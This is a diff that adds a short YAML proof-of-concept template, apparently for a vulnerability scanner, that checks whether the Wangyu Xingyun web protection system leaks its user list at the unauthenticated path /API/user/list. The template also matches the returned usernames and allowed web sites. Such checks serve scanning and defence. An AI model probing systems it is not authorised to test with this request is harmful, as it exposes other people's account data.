@@ -1,0 +1,14 @@
+id: poc-yaml-wangyu-xingyun-web-protection-system-information-leakage
+info:
+  name: 网御星云web防护系统信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Apache
+requests:
+- method: GET
+  path: /API/user/list
+  expression: status_code == 200  && contains(body,"items") && contains(body,"username")
+    && contains(body,"allowed_web_site") && content_type == "application/json"
+variables: {}
+transport: http
